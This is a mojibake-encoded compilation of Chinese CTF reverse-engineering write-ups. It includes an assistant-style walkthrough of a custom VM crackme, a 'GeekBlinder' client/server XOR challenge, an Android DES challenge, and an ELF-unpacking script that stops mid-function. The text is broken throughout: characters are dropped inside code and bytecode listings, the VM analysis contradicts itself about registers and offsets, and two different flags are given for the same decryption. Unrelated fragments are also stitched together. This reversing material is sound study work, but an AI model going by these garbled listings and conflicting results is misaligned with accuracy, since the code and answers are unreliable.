**æˆ‘éœ€è¦äº†è§£ä»¥ä¸‹ä¿¡æ¯ï¼š**

1. **`sub_5c6d7e` çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ** ï¼ˆè¿™æ˜¯ä¼ é€’ç»™ _1a2b3c` çš„æ•°æ®ï¼‰
2. **`xor_compare_program` å’Œ `string_process_program` çš„å…·ä½“å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ** ï¼ˆè¿™ä¸¤ä¸ªæ˜¯VMç¨‹åºï¼‰
3. **å…¨å±€å˜é‡çš„å®šä¹‰ï¼š**
   - `dword_50AC`
   - `dword_50CC`
   - `dword_5134`
   - `global_vm`
4. **VMå¯„å­˜å™¨ç»“æ„ï¼š** ä» `vm_get_register` å‡½æ•°çš„å®ç°ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰
5. **å†…å­˜å¸ƒå±€ï¼š** çœ‹èµ·æ¥VMå†…å­˜ä¸­ï¼š
   - offset 256: å­˜æ”¾ `sub_5c6d7e` çš„æ•°æ®ï¼ˆ29å­—èŠ‚ï¼‰
   - offset 512: å­˜æ”¾ç”¨æˆ·è¾“
   - offset 768: æŸäº›å¤„ç†åæä¾›è¿™äº›æ•°æ®ï¼Œç‰¹åˆ«æ˜¯ï¼š

- `sub_5c6d7e` çš„æ•°æ®å†…å®¹
- `string_process_program` çš„å­—èŠ‚ç xor_compare_program` çš„å­—èŠ‚ç 
- `vm_get_register` å‡½æ•°çš„å®ç°

è¿™æ ·æˆ‘æ‰èƒ½å‡†ç¡®åˆ†æVMæ‰§è¡Œçš„é€»è¾‘å¹¶å¸®ä½ è§£é¢˜ã€‚



è°¢æä¾›è¯¦ç»†æ•°æ®ï¼è®©æˆ‘ç»§ç»­è·å‰©ä½™çš„å…³é”®æ•°æ®ï¼š

**è¿˜éœ€è¦ä»¥ä¸‹ä¿¡æ¯ï¼š**

1. **`xor_compare_program` çš„å®Œæ•´æ•°æ®** - ä½ æä¾›çš„æ•°æ®åœ¨ 0x50AB å¤„æˆªæ–­äº†ï¼Œä½† `sub_9e8f7a` ä¸­è°ƒç”¨ `vm_load_program(a1, &xor_compare_program, 37);` è¯´æ˜è¿™ä¸ªç¨‹åºæœ‰ 37 å­—èŠ‚ã€‚è¯·æä¾›å®Œæ•´çš„ 37 å­—èŠ‚æ•°æ®ã€‚
2. **å…¨å±€å˜é‡ `dword_50AC`ã€`dword_50CC`ã€`dword_5134` çš„åœ°å€** - æˆ‘çœ‹åˆ°åœ¨æ•°æ®æ®µä¸­ 0x50AC æ­£å¥½æ˜¯ `xor_compare_program` çš„ä¸€éƒ¨åˆ†ï¼Œè¿™å¯èƒ½æ˜¯é‡å çš„ã€‚èƒ½å¦ç¡®è®¤è¿™ä¸‰ä¸ªå…¨å±€å˜é‡çš„å®é™…åœ°å€ï¼Ÿ
3. **`vm_push` å’Œ `vm_pop` å‡½æ•°çš„å®ç°**ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰

ä»ç›®å‰çš„ä¿¡æ¯ï¼Œæˆ‘å·²ç»å¯ä»¥å¼€å§‹åˆ†æäº†ï¼š



å®Œï¼ç°äº†æ‰€æœ‰æ•°æ®ã€‚è®©æˆ‘å®Œæ•´åˆ†æè¿™é“é¢˜ã€‚

## å®Œæ•´åˆ†æ

### 1. ç¨‹åºæ‰§è¡Œæµç¨‹

1. `string_process_program` å¤„ç†å­˜å‚¨åœ¨ offset çš„æ•°æ®ï¼ˆ29å­—èŠ‚çš„ _5c6d7e`ï¼‰
2. å¤„ç†åçš„ç»“æœå­˜å‚¨åˆ° offset 768
3. ç”¨æˆ·è¾“å…¥å­˜å‚¨åˆ° offset 512
4. `x_programç”¨æˆ·è¾“å…¥è¿›è¡Œå¤„ç†å¹¶ä¸ offset 768 çš„æ•°æ®æ¯”è¾ƒ

### 2. è§£æ `string_process_program`

è®©æˆ‘é€æ¡è§£æï¼ˆæ¯æ¡æŒ‡ä»¤8å­—èŠ‚ï¼‰ï¼š

python

```python
# R1 = 0 (å¾ªç¯è®¡æ•°å™¨)
# R2 = 29 (é•¿åº¦)
# R3 = 256+3 (æºæ•°æ®èµ·å§‹ä½ç½®+3)
# R5 = 768 (ç›®æ ‡ä½ç½®)

# å¾ªç¯: for i in range(29):
#   R6 = i + 1
#   R6 += R1  
#   R0 = mem]  # è¯»å–æºæ•°æ®
#   R0 += R3      # åŠ ä¸Šåç§»
#   mem[R6] = R0  # å†™å›
#   R1 += 1
#   è·³è½¬åˆ°å¾ªç¯å¼€å§‹
```

ç­‰ç­‰ï¼Œè®©æˆ‘é‡æ–°ä»”ç»†è§£æï¼š

```
offset 0x00: 01 01 FF 00 00000000  # MOV R1, 0
offset 0x08: 01 02 FF 00 0000001D  # MOV R2, 29
offset 0x10: 01 03 FF 00 00000003  # MOV R3, 3
offset 0x18: 01 05 FF 00 00000100  # MOV R5, 256
offset 0x20: 06 01 02 00 00000000  # CMP R1, R2
offset 0x28: 08 00 00 00 0000000A  # JE 0x0A (è·³åˆ°ç»“æŸ)
offset 0x30: 01 06 05 00 00000000  # MOV R6, R5
offset 0x38: 02 06 01 00 00000000  # ADD R6, R1
offset 0x40: 0E 00 06 00 00000000  # LOAD R0, [R6]
offset 0x48: 02 00 03 00 00000000  # ADD R0, R3
offset 0x50: 0F 00 00 00000000  # STORE [R6], R0
offset 0x58: 02 01 FF 00 00000001  # ADD R1, 1
offset 0x60: 07 00 00 00 00000004  # JMP 0x04
offset 0x68: FF ...                # HALT
```

**`string_process_program` ç®—æ³•ï¼š**

python

```python
for i in range(29):
    mem[256 + i] = (mem[256 + i] + 3
```

### 3. è§£æ `xor_compare_program`

è¿™ä¸ªç¨‹åºæ›´é•¿ï¼Œè®©æˆ‘ä»”ç»†è§£æï¼š

```
0x00: 01 01 FF 00 00000000  
0x08: 01 02 FF 00 dword_50AC  # MOV R2, [dword_50AC] (è¾“å…¥é•¿åº¦)
0x10: 01 03 FF 00 0000005A  # MOV R3, 90 (0x5A, XOR key)
0x18: 01 04 FF 00 00000001  # MOV R4, 1 (é€’å¢å€¼)
0x20: 01 05 FF 00 00000200  # MOV R5, 512 (ç”¨æˆ·è¾“å…¥ä½ç½®)
0x28: 01 07 FF 00 dword_50CC  # MOV R7, [dword_50CC] (=768, ç›®æ ‡ä½ç½®)
0x30: 06 01 02 00 00000000  # CMP R1, R2
0x38: 08 00 00 00 0000000F  # JE 0x0F (ç»“æŸ)
0x40: 01 06 05 00 00000000  # MOV R6, R5
0x48: 02 06 01 00 00000000  # ADD R6, R1
0x50: 0E 00 06 00 00000000  # LOAD R0, [R6]  (è¯»ç”¨æˆ·è¾“å…¥[i])
0x58: 10 00 00000000  # XOR R0, R3
0x60: 0F 06 00 00 00000000  # STORE [R6], R0  (å†™å›)
0x68: 02 01 FF 00 00000001  # ADD R1, 1
0x70: 07 00 00 00 00000006  # JMP 0x06
0x78: 01 06 FF 00 0000001D  # MOV R6, 29
0x80: 06 02 06 00 00000000  # CMP R2, R6
0x88: 09 00 00 00 00000022  # JNE 0x22 (å¤±è´¥)
0x90: 01 07 FF 00 dword_5134  # MOV R7, [dword_5134] (=768)
0x98: 01 01 FF 00 00000000  # MOV R1, 0
0xA0: 06 01 02 00 00000000  # CMP R1, R2
0xA8: 08 00 00 00 00000024  # JE 0x24 (æˆåŠŸ)
0xB0: 01 06 07 00 00000000  # MOV R6, R7
0xB8: 02 06 01 00 00000000  # ADD R6, R1
0xC0: 0E 00 06 00 00000000  # LOAD R0, [R6]  (è¯»ç›®æ ‡[i])
0xC8: 0A 00 00 00 00000000  # PUSH R0
0xD0: 01 06 05 00 00000000  # MOV R6, R02 06 01 00 00000000  # ADD R6, R1
0xE0: 0E 00 06 00 00000000  # LOAD R0, [R6]  (è¯»å¤„ç†åçš„è¾“å…¥[i])
0xE8: 0B 06 00 00 00000000  # POP R6
0xF0: 06 06 00 00 00000000  # CMP R6, R0 00 00 00 00000022  # JNE 0x22 (å¤±è´¥)
0x100: 02 01 FF 00 00000001 # ADD R1, 1
0x108: 07 00 00 00 00000013 # JMP 0x13
0x110: 01 04 FF 00 00000000 # MOV R4, 0 (å¤±è´¥æ ‡å¿—)
0x118: FF ...                # HALT
```

**`xor_compare_program` ç®—æ³•ï¼š**

python

```python
# ç¬¬ä¸€æ­¥ï¼šXORå¤„ç†
for i in range(input_length):
    input[512 + i] ^= 0x5A

# ç¬¬äºŒæ­¥ï¼šæ£€æŸ¥é•¿åº¦
if input_length != 29:
    fail()

# ç¬¬ä¸‰æ­¥ï¼šé€å­—èŠ‚æ¯”è¾ƒ
for i in range(29):
    if mem[768 + i] != input[512 + i]:
        fail()
success()
```

### 4. è®¡ç®—ç­”æ¡ˆ

python

```python
# _sub_5c6d7e çš„æ•°æ®
original = [0x06, 0x00, 0x16, 0x1E, 0x0A, 0x66, 0x68, 0x36, 0x67, 0x34, 
            0x66, 0x02, 0x2B, 0x67, 0x02, 0x25, 0x66, 0x17, 0x68, 0x02, 
            0x25, 0x66, 0x29, 0x3C, 0x25, 0x26, 0x3C, 0x78, 0x24]

# string_process_program å¤„ç†ï¼šæ¯ä¸ªå­—èŠ‚ +3
processed = [(x + 3) & 0xFF for x in original]

# ç”¨æˆ·è¾“å…¥éœ€è¦æ»¡è¶³ï¼šinput[i] ^ 0x5A == processed[i]
# å› æ­¤ï¼šinput[i] = processed[i] ^ 0x5A
flag = ''.join(chr(x ^ 0x5A) for x in processed)

print(flag)
```

# GeekBlinder

## é¢˜ç›®ä¿¡æ¯

- ç±»å‹ï¼šäºŒè¿›åˆ¶é€†å‘ + å¯†ç å­¦
- æ–‡ä»¶ï¼šå®¢æˆ·ç«¯ç¨‹åºã€æœåŠ¡ç«¯ç¨‹åºã€libattr.so åŠ¨æ€åº“
- éš¾åº¦ï¼šä¸­ç­‰

---

## è§£é¢˜æµç¨‹

### ç¬¬ä¸€æ­¥ï¼šç†è§£ç¨‹åºæ¶æ„

**åˆ†æå®¢æˆ·ç«¯ (client)**

```c
sub_1C12() {
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    connect(socket_fd, "127.0.0.1", 8964);  // è¿æ¥æœ¬åœ°æœåŠ¡å™¨
    
    // å‘é€è¯·æ±‚ï¼šcode=1, data=ç”¨æˆ·è¾“å…¥
    sub_1815(socket_fd, 1, user_input, input_len);
    
    // æ¥æ”¶å“åº”
    sub_19CE(socket_fd, &code, &result, &result_len);
}
```

**å…³é”®å‘ç°ï¼š**

- å®¢æˆ·ç«¯è¿æ¥æœ¬åœ° 8964 ç«¯å£
- å‘é€æ ¼å¼ï¼š`code(4å­—èŠ‚) + data_len(4å­—èŠ‚) + data`
- code=1 è¡¨ç¤ºéªŒè¯è¯·æ±‚

---

### ç¬¬äºŒæ­¥ï¼šåˆ†ææœåŠ¡ç«¯å¤„ç†æµç¨‹

**ä¸»å‡½æ•°é€»è¾‘**

```c
main() {
    listen_fd = socket(...);
    bind(listen_fd, 0.0.0.0:8964);
    listen(listen_fd, 5);
    
    while(1) {
        client_fd = accept(listen_fd, ...);
        pthread_create(..., sub_17B4, client_fd);  // åˆ›å»ºçº¿ç¨‹å¤„ç†
    }
}
```

**è¯·æ±‚å¤„ç†é“¾**

```
sub_17B4 (çº¿ç¨‹å…¥å£)
    â†“
sub_2536 (æ¥æ”¶è¯·æ±‚: code, data, size)
    â†“
sub_1769 (åˆ†å‘å¤„ç†)
    â†“
if (code == 1):
    sub_1623 (éªŒè¯å¤„ç†)
```

---

### ç¬¬ä¸‰æ­¥ï¼šæ·±å…¥éªŒè¯é€»è¾‘

**sub_1623 - éªŒè¯å…¥å£**

```c
__int64 sub_1623(int fd, char *data, int len) {
    // æ£€æŸ¥æ ¼å¼ï¼šå‰ 4 å­—èŠ‚æ˜¯æ•°æ®é•¿åº¦
    if (len != *(uint32_t*)data + 4)
        return error;
    
    // Base64 è§£ç 
    sub_293C(data+4, len-4, &decoded_data, &decoded_len);
    
    // æ ¸å¿ƒéªŒè¯
    sub_1F90(decoded_data, decoded_len, &result);
    
    // è¿”å›éªŒè¯ç»“æœ
    sub_15C2(fd, result != 0, 0);
}
```

**sub_293C - Base64 è§£ç å™¨**

```c
__int64 sub_293C(char *input, int len, void **output, int *out_len) {
    // æ ‡å‡† Base64 è§£ç å®ç°
    // sub_2654: å­—ç¬¦æ˜ å°„å‡½æ•°
    // A-Z -> 0-25
    // a-z -> 26-51  
    // 0-9 -> 52-61
    // + -> 62, / -> 63
}
```

---

### ç¬¬å››æ­¥ï¼šæ‰¾åˆ°æ ¸å¿ƒéªŒè¯å‡½æ•°

**sub_1F90 - éªŒè¯æ ¸å¿ƒ**

```c
__int64 sub_1F90(char *input, int len, bool *result) {
    // æ£€æŸ¥å‡½æ•°æŒ‡é’ˆæ˜¯å¦å·²åŠ è½½
    if (!qword_5038 || !qword_5040)
        return error;
    
    // è°ƒç”¨ qword_5038 å¤„ç†è¾“å…¥
    qword_5038(input, len, &processed, &processed_len);
    
    // è°ƒç”¨ qword_5040 è·å–æœŸæœ›å€¼
    qword_5040(&expected, &expected_len);
    
    // æ¯”è¾ƒç»“æœ
    *result = (processed_len == expected_len) && 
              (memcmp(processed, expected, len) == 0);
}
```

**å…³é”®å‘ç°ï¼š**

- `qword_5038` å’Œ `qword_5040` æ˜¯åŠ¨æ€åŠ è½½çš„å‡½æ•°æŒ‡é’ˆ
- æ¥è‡ª `libattr.so` åŠ¨æ€åº“

---

### ç¬¬äº”æ­¥ï¼šåˆ†æ libattr.so

**å¯¼å‡ºå‡½æ•°åˆ—è¡¨ï¼š**

```
attr_xor_cipher          (0x1183)  â†’ å¯¹åº” qword_5038
attr_get_hidden_cipher   (0x1214)  â†’ å¯¹åº” qword_5040
```

**attr_xor_cipher - XOR åŠ å¯†å‡½æ•°**

```c
__int64 attr_xor_cipher(char *input, int len, void **output, int *out_len) {
    void *result = malloc(len);
    
    // XOR åŠ å¯†
    for (int i = 0; i < len; i++) {
        result[i] = input[i] ^ "geek2025"[i % 8];
    }
    
    *output = result;
    *out_len = len;
}
```

**åŠ å¯†ç®—æ³•ï¼š**

- å¯†é’¥ï¼š`"geek2025"` (8 å­—èŠ‚å¾ªç¯)
- ç®—æ³•ï¼šç®€å• XOR å¾ªç¯åŠ å¯†

**attr_get_hidden_cipher - è¿”å›åŠ å¯†çš„ flag**

```c
__int64 attr_get_hidden_cipher(void **output, int *len) {
    void *data = malloc(91);
    
    // åŠ å¯†çš„ flag æ•°æ®ï¼ˆ91 å­—èŠ‚ï¼‰
    *(uint64_t*)(data+0)  = 0x7C725E7310263C34;
    *(uint64_t*)(data+8)  = 0x5D666F5505541F1E;
    *(uint64_t*)(data+16) = 0x4601535D19153A54;
    *(uint64_t*)(data+24) = 0x4266037034165614;
    *(uint64_t*)(data+32) = 0x505E5974340B0002;
    *(uint64_t*)(data+40) = 0x5B5D536D18543A54;
    *(uint64_t*)(data+48) = 0x5A666F4B19251713;
    *(uint64_t*)(data+56) = 0x6A5E705F19550B38;
    *(uint64_t*)(data+64) = 0x0651594608251717;
    *(uint64_t*)(data+72) = 0x506D5560340B5438;
    *(uint64_t*)(data+80) = 0x0440555705540209;
    *(uint16_t*)(data+88) = 0x0209;
    *(uint8_t*)(data+90)  = 0x18;
    
    *output = data;
    *len = 91;
}
```

---

### ç¬¬å…­æ­¥ï¼šéªŒè¯é€»è¾‘æ¢³ç†

**å®Œæ•´éªŒè¯æµç¨‹ï¼š**

```
ç”¨æˆ·è¾“å…¥ (Base64 ç¼–ç )
    â†“
Base64 è§£ç  â†’ plaintext
    â†“
XOR åŠ å¯† (å¯†é’¥ "geek2025") â†’ encrypted
    â†“
ä¸ attr_get_hidden_cipher() è¿”å›çš„åŠ å¯†æ•°æ®æ¯”è¾ƒ
    â†“
ç›¸ç­‰åˆ™éªŒè¯é€šè¿‡
```

**ç ´è§£ç›®æ ‡ï¼š**
æ‰¾åˆ° `plaintext`ï¼Œä½¿å¾—ï¼š

```
XOR(plaintext, "geek2025") == encrypted_flag_data
```

---

### ç¬¬ä¸ƒæ­¥ï¼šè§£å¯†è·å– flag

**XOR æ€§è´¨ï¼š**

- `A ^ B = C`
- `C ^ B = A`

å› æ­¤ï¼š`plaintext = encrypted_flag_data ^ "geek2025"`

**è§£å¯†è„šæœ¬ï¼š**

```python
#!/usr/bin/env python3

# XOR å¯†é’¥
key = b"geek2025"

# åŠ å¯†çš„ flag æ•°æ®ï¼ˆå°ç«¯åºï¼‰
encrypted = bytes([
    # 0x7C725E7310263C34
    0x34, 0x3C, 0x26, 0x10, 0x73, 0x5E, 0x72, 0x7C,
    # 0x5D666F5505541F1E
    0x1E, 0x1F, 0x54, 0x05, 0x55, 0x6F, 0x66, 0x5D,
    # 0x4601535D19153A54
    0x54, 0x3A, 0x15, 0x19, 0x5D, 0x53, 0x01, 0x46,
    # 0x4266037034165614
    0x14, 0x56, 0x16, 0x34, 0x70, 0x03, 0x66, 0x42,
    # 0x505E5974340B0002
    0x02, 0x00, 0x0B, 0x34, 0x74, 0x59, 0x5E, 0x50,
    # 0x5B5D536D18543A54
    0x54, 0x3A, 0x54, 0x18, 0x6D, 0x53, 0x5D, 0x5B,
    # 0x5A666F4B19251713
    0x13, 0x17, 0x25, 0x19, 0x4B, 0x6F, 0x66, 0x5A,
    # 0x6A5E705F19550B38
    0x38, 0x0B, 0x55, 0x19, 0x5F, 0x70, 0x5E, 0x6A,
    # 0x0651594608251717
    0x17, 0x17, 0x25, 0x08, 0x46, 0x59, 0x51, 0x06,
    # 0x506D5560340B5438
    0x38, 0x54, 0x0B, 0x34, 0x60, 0x55, 0x6D, 0x50,
    # 0x0440555705540209
    0x09, 0x02, 0x54, 0x05, 0x57, 0x55, 0x40, 0x04,
    # 0x0209
    0x09, 0x02,
    # 0x18
    0x18
])

# è§£å¯†ï¼šXOR è¿ç®—
flag = bytearray()
for i in range(len(encrypted)):
    flag.append(encrypted[i] ^ key[i % 8])

print("è§£å¯†ç»“æœï¼š")
print(flag.decode('ascii'))
```

**è¿è¡Œç»“æœï¼š**

```
SYC{Y0u_h4ve_m4stered_the_4rt_of_l1nux_b1n4ry_r3vers3_eng1neer1ng_4nd_pr0gr4mm1ng_we11_d0ne}
```

---

## è§£é¢˜å…³é”®ç‚¹æ€»ç»“

### 1. **æ¶æ„åˆ†æ**

- è¯†åˆ«å®¢æˆ·ç«¯-æœåŠ¡å™¨é€šä¿¡æ¨¡å¼
- ç†è§£è‡ªå®šä¹‰åè®®æ ¼å¼

### 2. **æ§åˆ¶æµè¿½è¸ª**

- ä» `main` â†’ çº¿ç¨‹å‡½æ•° â†’ è¯·æ±‚åˆ†å‘ â†’ éªŒè¯é€»è¾‘
- è¯†åˆ«å…³é”®å‡½æ•°è°ƒç”¨é“¾

### 3. **åŠ¨æ€åº“åˆ†æ**

- å‘ç° `libattr.so` çš„å­˜åœ¨
- è¯†åˆ«åŠ¨æ€åŠ è½½çš„å‡½æ•°æŒ‡é’ˆ

### 4. **ç®—æ³•è¯†åˆ«**

- Base64 è§£ç å™¨ç‰¹å¾è¯†åˆ«
- XOR åŠ å¯†æ¨¡å¼è¯†åˆ«
- å¾ªç¯å¯†é’¥æ¨¡å¼

### 5. **æ•°æ®æå–**

- ä» `.rodata` æ®µæå–åŠ å¯†æ•°æ®
- æ³¨æ„å­—èŠ‚åºï¼ˆå°ç«¯åºï¼‰

### 6. **å¯†ç å­¦çŸ¥è¯†**

- XOR åŠ å¯†çš„å¯¹ç§°æ€§
- å·²çŸ¥å¯†æ–‡å’Œå¯†é’¥æ±‚æ˜æ–‡

---

## å®Œæ•´ Flag

```
SYC{An@Iyz1ng_Th3_proc3ss3s_B3Tween_File3_1s_contr@ry_To_n0rm@l_pr@ctic3_1n_Re_eng1neer1ng}
```

---

## æŠ€æœ¯è¦ç‚¹

1. **Linux äºŒè¿›åˆ¶é€†å‘**ï¼šELF æ–‡ä»¶æ ¼å¼ã€åŠ¨æ€é“¾æ¥
2. **ç½‘ç»œç¼–ç¨‹**ï¼šSocket é€šä¿¡ã€è‡ªå®šä¹‰åè®®
3. **å¤šçº¿ç¨‹ç¼–ç¨‹**ï¼špthread åº“çš„ä½¿ç”¨
4. **åŠ¨æ€åº“åŠ è½½**ï¼šdlopen/dlsym æœºåˆ¶
5. **Base64 ç¼–ç **ï¼šæ ‡å‡† Base64 è§£ç å®ç°
6. **XOR åŠ å¯†**ï¼šå¾ªç¯å¯†é’¥ XOR åŠ å¯†/è§£å¯†
7. **IDA/Ghidra**ï¼šåç¼–è¯‘å™¨ä½¿ç”¨æŠ€å·§

# ez android

æŠŠsmailæ–‡ä»¶ç»™aiåˆ†æå®ƒå°±èƒ½ç»™å‡ºflag1æ€ä¹ˆå¾—å‡ºæ¥

```
from Crypto.Cipher import DES
import binascii

# ç›®æ ‡å¯†æ–‡
target = "CFBD7E4250A8AB56"
cipher_bytes = bytes.fromhex(target)

# DESå¯†é’¥
key = "12345678".encode('utf-8')

# è§£å¯†
cipher = DES.new(key, DES.MODE_ECB)
decrypted = cipher.decrypt(cipher_bytes)

# å»é™¤å¡«å……çš„0
plain_text = decrypted.rstrip(b'\x00')
print(f"Input1åº”è¯¥æ˜¯: {plain_text.decode('utf-8')}")
```

```
Input1åº”è¯¥æ˜¯: Th1s_1s_
```



flag2ä¸»è¦çœ‹libwrapper.so


æ³¨æ„åˆ°JNI_OnLoad

ç»™aiç„¶åç¡¬å‡¿å‡ºfunction2.so

```
#!/usr/bin/env python3
import struct


def find_data_section_offset(wrapper_file='libwrapper.so'):
    """æ‰¾åˆ°.dataèŠ‚çš„æ–‡ä»¶åç§»"""
    with open(wrapper_file, 'rb') as f:
        # è¯»å–ELFå¤´
        f.seek(0)
        elf_header = f.read(64)

        # æ£€æŸ¥æ˜¯å¦æ˜¯32ä½è¿˜æ˜¯64ä½
        elf_class = elf_header[4]
        if elf_class == 1:  # 32ä½
            e_shoff = struct.unpack('<I', elf_header[32:36])[0]
            e_shentsize = struct.unpack('<H', elf_header[46:48])[0]
            e_shnum = struct.unpack('<H', elf_header[48:50])[0]
            e_shstrndx = struct.unpack('<H', elf_header[50:52])[0]
        else:  # 64ä½
            e_shoff = struct.unpack('<Q', elf_header[40:48])[0]
            e_shentsize = struct.unpack('<H', elf_header[58:60])[0]
            e_shnum = struct.unpack('<H', elf_header[60:62])[0]
            e_shstrndx = struct.unpack('<H', elf_header[62:64])[0]

        print(f"ğŸ“Š ELFä¿¡æ¯ï¼š{'32ä½' if elf_class == 1 else '64ä½'}")
        print(f"   Sectionæ•°é‡: {e_shnum}")
        print(f"   String table index: {e_shstrndx}")

        # è¯»å–å­—ç¬¦ä¸²è¡¨section header
        f.seek(e_shoff + e_shstrndx * e_shentsize)
        if elf_class == 1:
            shstrtab_header = f.read(40)
            shstrtab_offset = struct.unpack('<I', shstrtab_header[16:20])[0]
        else:
            shstrtab_header = f.read(64)
            shstrtab_offset = struct.unpack('<Q', shstrtab_header[24:32])[0]

        print(f"   String table offset: 0x{shstrtab_offset:X}")

        # éå†æ‰€æœ‰section
        print("\nğŸ“‹ æ‰€æœ‰èŠ‚ä¿¡æ¯:")
        data_section = None

        for i in range(e_shnum):
            f.seek(e_shoff + i * e_shentsize)
            if elf_class == 1:
                section_header = f.read(40)
                sh_name = struct.unpack('<I', section_header[0:4])[0]
                sh_type = struct.unpack('<I', section_header[4:8])[0]
                sh_addr = struct.unpack('<I', section_header[12:16])[0]
                sh_offset = struct.unpack('<I', section_header[16:20])[0]
                sh_size = struct.unpack('<I', section_header[20:24])[0]
            else:
                section_header = f.read(64)
                sh_name = struct.unpack('<I', section_header[0:4])[0]
                sh_type = struct.unpack('<I', section_header[4:8])[0]
                sh_addr = struct.unpack('<Q', section_header[16:24])[0]
                sh_offset = struct.unpack('<Q', section_header[24:32])[0]
                sh_size = struct.unpack('<Q', section_header[32:40])[0]

            # è¯»å–èŠ‚åç§°
            f.seek(shstrtab_offset + sh_name)
            name = b''
            for _ in range(256):  # é™åˆ¶é•¿åº¦é˜²æ­¢æ— é™å¾ªç¯
                c = f.read(1)
                if not c or c == b'\x00':
                    break
                name += c

            name_str = name.decode('utf-8', errors='ignore')

            # æ‰“å°èŠ‚ä¿¡æ¯
            if i < 10 or '.data' in name_str or '.rodata' in name_str:
                print(f"   [{i:2d}] {name_str:15s} VAddr:0x{sh_addr:08X} Offset:0x{sh_offset:06X} Size:0x{sh_size:06X}")

            # æ£€æŸ¥æ˜¯å¦åŒ…å«æˆ‘ä»¬çš„ç›®æ ‡åœ°å€ 0x9420
            if sh_addr <= 0x9420 < sh_addr + sh_size:
                print(f"   â­ åœ°å€ 0x9420 åœ¨èŠ‚ '{name_str}' ä¸­!")
                data_section = (sh_addr, sh_offset, sh_size, name_str)

        if data_section:
            return data_section[:2]  # è¿”å›è™šæ‹Ÿåœ°å€å’Œæ–‡ä»¶åç§»
        else:
            print("\nâŒ æœªæ‰¾åˆ°åŒ…å«åœ°å€ 0x9420 çš„èŠ‚")
            return None, None


def extract_encrypted_so_direct(wrapper_file='libwrapper.so', output_file='function2.so'):
    """ç›´æ¥æœç´¢åŠ å¯†æ•°æ®çš„æ¨¡å¼"""

    ENCRYPTED_LEN = 0x1AC0
    XOR_KEY = 0xAA

    print(f"\nğŸ” æ–¹æ³•2ï¼šç›´æ¥æœç´¢åŠ å¯†çš„ELFå¤´æ¨¡å¼...")

    try:
        with open(wrapper_file, 'rb') as f:
            data = f.read()

        # XORåçš„ELFå¤´åº”è¯¥æ˜¯ '\x7fELF'
        # XORå‰åº”è¯¥æ˜¯ '\xd5\xc5\xce\xc6' (æ¯ä¸ªå­—èŠ‚XOR 0xAA)
        xored_elf_header = bytes([ord(c) ^ XOR_KEY for c in '\x7fELF'])

        print(f"   æœç´¢XORåçš„ELFå¤´: {' '.join(f'{b:02X}' for b in xored_elf_header)}")

        # æŸ¥æ‰¾æ‰€æœ‰å¯èƒ½çš„ä½ç½®
        offset = 0
        found_positions = []
        while True:
            pos = data.find(xored_elf_header, offset)
            if pos == -1:
                break
            found_positions.append(pos)
            offset = pos + 1

        if found_positions:
            print(f"âœ… æ‰¾åˆ° {len(found_positions)} ä¸ªå¯èƒ½çš„ä½ç½®:")
            for i, pos in enumerate(found_positions):
                print(f"   [{i}] æ–‡ä»¶åç§»: 0x{pos:06X}")
                # éªŒè¯ä¸€ä¸‹
                sample = data[pos:pos + 16]
                decrypted_sample = bytes([b ^ XOR_KEY for b in sample])
                print(f"       è§£å¯†åå‰16å­—èŠ‚: {' '.join(f'{b:02X}' for b in decrypted_sample)}")

                # å¦‚æœåªæœ‰ä¸€ä¸ªä½ç½®ï¼Œæˆ–è€…è¿™æ˜¯ç¬¬ä¸€ä¸ªï¼Œå°±ä½¿ç”¨å®ƒ
                if len(found_positions) == 1 or i == 0:
                    print(f"\nğŸ“¦ ä½¿ç”¨ä½ç½® 0x{pos:06X} æå–æ•°æ®...")
                    encrypted_data = data[pos:pos + ENCRYPTED_LEN]

                    # XORè§£å¯†
                    decrypted_data = bytes([b ^ XOR_KEY for b in encrypted_data])

                    # ä¿å­˜
                    with open(output_file, 'wb') as f:
                        f.write(decrypted_data)

                    print(f"ğŸ’¾ å·²ä¿å­˜è§£å¯†åçš„SOæ–‡ä»¶åˆ°: {output_file}")
                    print(f"   æ–‡ä»¶å¤§å°: {len(decrypted_data)} å­—èŠ‚")

                    # åˆ†æ
                    find_strings_in_data(decrypted_data)
                    return decrypted_data
        else:
            print("âŒ æœªæ‰¾åˆ°XORåŠ å¯†çš„ELFå¤´")

    except Exception as e:
        print(f"âŒ é”™è¯¯ï¼š{e}")
        import traceback
        traceback.print_exc()


def find_strings_in_data(data):
    """åœ¨æ•°æ®ä¸­æŸ¥æ‰¾å¯èƒ½çš„å­—ç¬¦ä¸²"""
    print("\nğŸ” æŸ¥æ‰¾å…³é”®å­—ç¬¦ä¸²...")

    all_strings = []
    current_string = []

    for i, b in enumerate(data):
        if 32 <= b < 127:  # å¯æ‰“å°ASCIIå­—ç¬¦
            current_string.append(chr(b))
        else:
            if len(current_string) > 4:
                s = ''.join(current_string)
                all_strings.append((i - len(s), s))
            current_string = []

    # æŸ¥æ‰¾ç‰¹å®šå…³é”®è¯
    keywords = ['function2', 'Java', 'com/example', 'encrypt', 'decrypt',
                'key', 'input', 'flag', 'check', 'verify', 'JNI']

    relevant_strings = []
    for offset, s in all_strings:
        for kw in keywords:
            if kw.lower() in s.lower():
                relevant_strings.append((offset, s))
                break

    if relevant_strings:
        print("ğŸ“ æ‰¾åˆ°çš„ç›¸å…³å­—ç¬¦ä¸²:")
        for offset, s in relevant_strings[:20]:
            print(f"   0x{offset:04X}: {s[:80]}")

    # æ€»æ˜¯æ˜¾ç¤ºä¸€äº›å­—ç¬¦ä¸²
    print("\nğŸ“ å…¶ä»–å­—ç¬¦ä¸²ç¤ºä¾‹:")
    for offset, s in all_strings[10:20]:  # è·³è¿‡å‰é¢çš„ï¼Œæ˜¾ç¤ºä¸­é—´çš„ä¸€äº›
        if len(s) > 10:  # åªæ˜¾ç¤ºè¾ƒé•¿çš„å­—ç¬¦ä¸²
            print(f"   0x{offset:04X}: {s[:80]}")


def extract_with_both_methods():
    """å°è¯•ä¸¤ç§æ–¹æ³•æå–"""
    print("ğŸš€ å¼€å§‹ä»libwrapper.soæå–encrypted_so\n")

    # æ–¹æ³•1ï¼šé€šè¿‡èŠ‚ä¿¡æ¯
    print("ğŸ“ æ–¹æ³•1ï¼šé€šè¿‡ELFèŠ‚ä¿¡æ¯æŸ¥æ‰¾...")
    data_vaddr, data_offset = find_data_section_offset()

    if data_vaddr and data_offset:
        encrypted_so_offset = data_offset + (0x9420 - data_vaddr)
